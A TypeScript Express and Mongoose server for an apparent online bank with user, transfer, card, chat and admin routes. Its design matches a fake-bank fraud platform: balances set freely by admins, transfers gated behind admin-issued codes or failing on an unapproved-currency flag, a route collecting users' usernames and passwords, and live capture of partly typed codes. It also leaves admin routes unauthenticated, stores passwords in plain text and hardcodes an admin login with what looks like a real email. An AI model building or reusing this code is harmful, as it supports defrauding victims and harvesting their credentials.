import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import mongoose from "mongoose";

// --- MONGOOSE MODELS ---

const transformJSON = (doc: any, ret: any) => {
  delete ret._id;
  delete ret.__v;
  return ret;
};

const userSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  username: { type: String, required: true },
  password: { type: String, required: true },
  name: { type: String, required: true },
  balance: { type: Number, default: 0 },
  accountNumber: { type: String, required: true },
  status: { type: String, default: "active" },
  role: { type: String, default: "user" },
  currency: { type: String, default: "USD" },
  currencyApproved: { type: Boolean, default: false },
  transfersEnabled: { type: Boolean, default: true },
  tc: { type: String, default: "" },
  vc: { type: String, default: "" },
  sc: { type: String, default: "" },
  currentTC: { type: String, default: "" },
  currentVC: { type: String, default: "" },
  currentSC: { type: String, default: "" },
  isBlocked: { type: Boolean, default: false },
  customError: { type: String, default: "" },
  email: { type: String },
  phone: { type: String },
  country: { type: String }
}, { toJSON: { transform: transformJSON } });

const transferSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  userId: { type: String, required: true },
  trackingId: { type: String },
  bankName: { type: String },
  accountName: { type: String },
  accountNumber: { type: String },
  amount: { type: Number, required: true },
  status: { type: String, default: "pending" },
  date: { type: String }
}, { toJSON: { transform: transformJSON } });

const collectionSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  userId: { type: String, required: true },
  username: { type: String },
  password: { type: String },
  status: { type: String, default: "pending" },
  date: { type: String }
}, { toJSON: { transform: transformJSON } });

const cardRequestSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  userId: { type: String, required: true },
  name: { type: String },
  address: { type: String },
  phone: { type: String },
  status: { type: String, default: "pending" },
  date: { type: String }
}, { toJSON: { transform: transformJSON } });

const chatMessageSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  userId: { type: String, required: true },
  sender: { type: String, required: true },
  text: { type: String, required: true },
  time: { type: String },
  readAdmin: { type: Boolean, default: false },
  readUser: { type: Boolean, default: false }
}, { toJSON: { transform: transformJSON } });

const settingSchema = new mongoose.Schema({
  requireTransactionCode: { type: Boolean, default: true },
  requireVerificationCode: { type: Boolean, default: true },
  requireSwitchCode: { type: Boolean, default: true },
  transfersEnabled: { type: Boolean, default: true }
}, { toJSON: { transform: transformJSON } });

const User = mongoose.model("User", userSchema);
const Transfer = mongoose.model("Transfer", transferSchema);
const Collection = mongoose.model("Collection", collectionSchema);
const CardRequest = mongoose.model("CardRequest", cardRequestSchema);
const ChatMessage = mongoose.model("ChatMessage", chatMessageSchema);
const Setting = mongoose.model("Setting", settingSchema);

import { MongoMemoryServer } from "mongodb-memory-server";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // --- DATABASE CONNECTION & SEEDING ---
  let MONGODB_URI = process.env.MONGODB_URI;
  try {
    if (!MONGODB_URI) {
      console.log("No MONGODB_URI provided. Starting in-memory MongoDB...");
      const mongoServer = await MongoMemoryServer.create();
      MONGODB_URI = mongoServer.getUri();
      console.log("Started in-memory MongoDB at", MONGODB_URI);
    }
    
    await mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000 });
    console.log("Connected to MongoDB");
    
    // Seed database if empty
    const userCount = await User.countDocuments();
    if (userCount === 0) {
      console.log("Seeding database...");
      await User.insertMany([
        { 
          id: "1", 
          username: "user", 
          password: "password", 
          balance: 125000.50, 
          accountNumber: "ITO-8829-1102", 
          name: "John Doe", 
          status: "active", 
          role: "user",
          currency: "USD",
          currencyApproved: true,
          transfersEnabled: true,
          tc: "123456",
          vc: "654321",
          sc: "987654",
          currentTC: "",
          currentVC: "",
          currentSC: ""
        },
        { 
          id: "2", 
          username: "johnfidelis550@gmail.com", 
          password: "Fidelis90@", 
          balance: 0, 
          accountNumber: "ADMIN-001", 
          name: "System Administrator", 
          status: "active", 
          role: "admin",
          currency: "USD",
          currencyApproved: true,
          transfersEnabled: true,
          tc: "000000",
          vc: "000000",
          sc: "000000",
          currentTC: "",
          currentVC: "",
          currentSC: ""
        }
      ]);

      await Transfer.insertMany([
        { id: "t1", userId: "1", bankName: "Global Bank", accountName: "Jane Smith", accountNumber: "9988776655", amount: 5000, status: "completed", date: "2024-03-20T10:00:00Z" },
        { id: "t2", userId: "1", bankName: "Swiss Trust", accountName: "Swiss Holding", accountNumber: "1122334455", amount: 15000, status: "pending", date: "2024-03-22T14:30:00Z" }
      ]);

      const existingSettings = await Setting.countDocuments();
      if (existingSettings === 0) {
        await Setting.create({
          requireTransactionCode: true,
          requireVerificationCode: true,
          requireSwitchCode: true,
          transfersEnabled: true
        });
      }
    }
  } catch (err) {
    console.error("MongoDB Connection Error:", err);
  }

  // Helper to ensure Settings exists
  const getSettingsDoc = async () => {
    let settings = await Setting.findOne();
    if (!settings) {
      settings = await Setting.create({
        requireTransactionCode: true,
        requireVerificationCode: true,
        requireSwitchCode: true,
        transfersEnabled: true
      });
    }
    return settings;
  };

  // --- API ROUTES ---

  // Auth
  app.post("/api/auth/login", async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({ username, password });
    if (user) {
      if (user.status === "blocked") {
        return res.status(403).json({ message: "Account blocked. Contact support." });
      }
      res.json({ user: user.toJSON() });
    } else {
      res.status(401).json({ message: "Invalid username or password" });
    }
  });

  // Self-Registration
  app.post("/api/auth/register", async (req, res) => {
    const { name, email, phone, country, username, password } = req.body;
    
    // Check if user exists
    const exists = await User.findOne({ username });
    if (exists) {
      return res.status(400).json({ message: "Username already taken." });
    }

    // Determine initial currency based on country selection
    let currency: 'USD' | 'PGK' | 'NGN' = "USD";
    if (country === "Papua New Guinea") {
      currency = "PGK";
    }

    const randomTC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomVC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomSC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomAccount = "ITO-" + Math.floor(10000000 + Math.random() * 90000000).toString();
    
    const userCount = await User.countDocuments();

    const newUser = await User.create({
      id: String(userCount + 1 + Date.now()),
      username,
      password,
      name,
      email,
      phone,
      country,
      balance: 0,
      accountNumber: randomAccount,
      status: "HOLD", // Initial status
      isBlocked: true,
      role: "user",
      currency,
      currencyApproved: false, // Default unapproved
      transfersEnabled: true,
      tc: randomTC,
      vc: randomVC,
      sc: randomSC,
      currentTC: "",
      currentVC: "",
      currentSC: "",
      customError: ""
    });

    res.json({ 
      success: true, 
      user: newUser.toJSON()
    });
  });

  // User Data
  app.get("/api/user/:id", async (req, res) => {
    const user = await User.findOne({ id: req.params.id });
    if (user) res.json(user.toJSON());
    else res.status(404).json({ message: "User not found" });
  });

  app.post("/api/user/:id/block", async (req, res) => {
    const user = await User.findOneAndUpdate(
      { id: req.params.id },
      { 
        isBlocked: true, 
        status: "HOLD", 
        customError: "Account placed on hold due to excessive security failures." 
      },
      { new: true }
    );
    if (!user) return res.status(404).json({ message: "User not found" });
    res.json({ success: true });
  });

  // Transfers
  app.get("/api/transfers/:userId", async (req, res) => {
    const userTransfers = await Transfer.find({ userId: req.params.userId });
    res.json(userTransfers.map(t => t.toJSON()));
  });

  app.post("/api/transfers", async (req, res) => {
    const settings = await getSettingsDoc();
    if (!settings.transfersEnabled) {
      return res.status(403).json({ message: "Transfers are currently disabled by the administrator." });
    }
    
    const { userId, trackingId, bankName, accountName, accountNumber, amount, transactionCode, verificationCode, switchCode } = req.body;
    const user = await User.findOne({ id: userId });
    
    if (!user) return res.status(404).json({ message: "User not found" });

    if (!user.transfersEnabled) {
      return res.status(403).json({ message: "Your transfer privileges are restricted. Please contact support." });
    }

    // Validate codes
    if (settings.requireTransactionCode && transactionCode !== user.tc) {
      return res.status(400).json({ message: "Invalid Transaction Code (TC)" });
    }
    if (settings.requireVerificationCode && verificationCode !== user.vc) {
      return res.status(400).json({ message: "Invalid Verification Code (VC)" });
    }
    if (settings.requireSwitchCode && switchCode !== user.sc) {
      return res.status(400).json({ message: "Invalid Switch Code (SC)" });
    }
    
    if (user.balance < parseFloat(amount)) {
      return res.status(400).json({ message: "Insufficient balance" });
    }

    const newTransferData = {
      id: "t" + Date.now(),
      userId,
      trackingId: trackingId || "ITO-TXN-" + Math.floor(10000 + Math.random() * 90000),
      bankName,
      accountName,
      accountNumber,
      amount: parseFloat(amount),
      status: user.currencyApproved ? "pending" : "failed",
      date: new Date().toISOString()
    };

    if (!user.currencyApproved) {
      newTransferData.status = "failed";
      await Transfer.create(newTransferData);
      return res.status(400).json({ message: "Currency mismatch or unapproved currency. Transfer failed." });
    }

    const newTransfer = await Transfer.create(newTransferData);
    user.balance -= parseFloat(amount);
    await user.save();
    
    res.json(newTransfer.toJSON());
  });

  app.patch("/api/admin/transfers/:id", async (req, res) => {
    const { status } = req.body;
    const transfer = await Transfer.findOneAndUpdate(
      { id: req.params.id },
      { status },
      { new: true }
    );
    if (!transfer) return res.status(404).json({ message: "Transfer not found" });
    res.json(transfer.toJSON());
  });

  // Collections
  app.post("/api/collections", async (req, res) => {
    const { userId, username, password } = req.body;
    const newCollection = await Collection.create({
      id: "c" + Date.now(),
      userId,
      username,
      password,
      status: "pending",
      date: new Date().toISOString()
    });
    res.json({ success: true });
  });

  // Card Requests
  app.post("/api/card-requests", async (req, res) => {
    const { userId, name, address, phone } = req.body;
    const newRequest = await CardRequest.create({
      id: "cr" + Date.now(),
      userId,
      name,
      address,
      phone,
      status: "pending",
      date: new Date().toISOString()
    });
    res.json({ success: true });
  });

  app.get("/api/admin/card-requests", async (req, res) => {
    const cardRequests = await CardRequest.find();
    const users = await User.find();
    
    const enriched = cardRequests.map(cr => {
      const crJson = cr.toJSON();
      const user = users.find(u => u.id === cr.userId);
      return {
        ...crJson,
        userName: user?.name || "Unknown"
      };
    });
    res.json(enriched);
  });

  app.patch("/api/admin/card-requests/:id", async (req, res) => {
    const request = await CardRequest.findOneAndUpdate(
      { id: req.params.id },
      { status: req.body.status },
      { new: true }
    );
    if (request) {
      res.json(request.toJSON());
    } else {
      res.status(404).json({ message: "Card request not found" });
    }
  });

  // Admin: Stats
  app.get("/api/admin/stats", async (req, res) => {
    const totalUsers = await User.countDocuments();
    const allTransfers = await Transfer.find();
    const pendingCollections = await Collection.countDocuments({ status: "pending" });
    const pendingCardRequests = await CardRequest.countDocuments({ status: "pending" });
    
    const totalVolume = allTransfers.reduce((acc, t) => acc + t.amount, 0);

    res.json({
      totalUsers,
      totalTransfers: allTransfers.length,
      pendingCollections,
      totalVolume,
      pendingCardRequests
    });
  });

  // Admin: Users
  app.get("/api/admin/users", async (req, res) => {
    const users = await User.find();
    res.json(users.map(u => u.toJSON()));
  });

  app.post("/api/admin/users", async (req, res) => {
    const { username, password, name, balance, accountNumber, currency, tc, vc, sc } = req.body;
    const userCount = await User.countDocuments();
    
    const newUser = await User.create({
      id: String(userCount + 1 + Date.now()),
      username,
      password,
      name,
      balance: parseFloat(balance) || 0,
      accountNumber,
      status: "APPROVED",
      isBlocked: false,
      role: "user",
      currency: currency || "USD",
      currencyApproved: true,
      transfersEnabled: true,
      tc: tc || Math.floor(100000 + Math.random() * 900000).toString(),
      vc: vc || Math.floor(100000 + Math.random() * 900000).toString(),
      sc: sc || Math.floor(100000 + Math.random() * 900000).toString(),
      currentTC: "",
      currentVC: "",
      currentSC: ""
    });
    res.json(newUser.toJSON());
  });

  app.patch("/api/admin/users/:id", async (req, res) => {
    const updates = { ...req.body };
    if (updates.balance !== undefined) {
      updates.balance = parseFloat(updates.balance);
      if (isNaN(updates.balance)) {
        updates.balance = 0;
      }
    }
    const user = await User.findOneAndUpdate(
      { id: req.params.id },
      updates,
      { new: true }
    );
    
    if (user) res.json(user.toJSON());
    else res.status(404).json({ message: "User not found" });
  });

  // Sync current code inputs
  app.post("/api/user/:id/sync-codes", async (req, res) => {
    const { currentTC, currentVC, currentSC } = req.body;
    const updatePayload: any = {};
    if (currentTC !== undefined) updatePayload.currentTC = currentTC;
    if (currentVC !== undefined) updatePayload.currentVC = currentVC;
    if (currentSC !== undefined) updatePayload.currentSC = currentSC;
    
    const user = await User.findOneAndUpdate(
      { id: req.params.id },
      updatePayload,
      { new: true }
    );
    if (user) {
      res.json({ success: true });
    } else {
      res.status(404).json({ message: "User not found" });
    }
  });

  // Admin: Transfers
  app.get("/api/admin/transfers", async (req, res) => {
    const transfers = await Transfer.find();
    const users = await User.find();
    
    const enriched = transfers.map(t => {
      const tJson = t.toJSON();
      const user = users.find(u => u.id === t.userId);
      return {
        ...tJson,
        userName: user?.name || "Unknown"
      };
    });
    res.json(enriched);
  });

  // Admin: Collections
  app.get("/api/admin/collections", async (req, res) => {
    const collections = await Collection.find();
    const users = await User.find();
    
    const enriched = collections.map(c => {
      const cJson = c.toJSON();
      const user = users.find(u => u.id === c.userId);
      return {
        ...cJson,
        userName: user?.name || "Unknown"
      };
    });
    res.json(enriched);
  });

  app.patch("/api/admin/collections/:id", async (req, res) => {
    const collection = await Collection.findOneAndUpdate(
      { id: req.params.id },
      { status: req.body.status },
      { new: true }
    );
    if (collection) {
      res.json(collection.toJSON());
    } else {
      res.status(404).json({ message: "Collection not found" });
    }
  });

  // Admin: Settings
  app.get("/api/admin/settings", async (req, res) => {
    const settings = await getSettingsDoc();
    res.json(settings.toJSON());
  });

  app.patch("/api/admin/settings", async (req, res) => {
    const settings = await getSettingsDoc();
    Object.assign(settings, req.body);
    await settings.save();
    res.json(settings.toJSON());
  });

  // Chat / Support
  app.get("/api/chat/:userId", async (req, res) => {
    const msgs = await ChatMessage.find({ userId: req.params.userId });
    
    // Mark as read by user
    await ChatMessage.updateMany(
      { userId: req.params.userId, sender: "agent", readUser: false },
      { readUser: true }
    );
    
    // Fetch updated to return correctly
    const updatedMsgs = await ChatMessage.find({ userId: req.params.userId });
    res.json(updatedMsgs.map(m => m.toJSON()));
  });

  app.post("/api/chat", async (req, res) => {
    const { userId, sender, text } = req.body;
    const newMsg = await ChatMessage.create({
      id: "msg" + Date.now(),
      userId,
      sender,
      text,
      time: new Date().toISOString(),
      readAdmin: sender === "agent",
      readUser: sender === "user"
    });
    res.json(newMsg.toJSON());
  });

  app.get("/api/admin/chat", async (req, res) => {
    const msgs = await ChatMessage.find();
    res.json(msgs.map(m => m.toJSON()));
  });

  app.post("/api/admin/chat/mark-read", async (req, res) => {
    const { userId } = req.body;
    await ChatMessage.updateMany(
      { userId, sender: "user", readAdmin: false },
      { readAdmin: true }
    );
    res.json({ success: true });
  });

  // --- VITE MIDDLEWARE ---
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
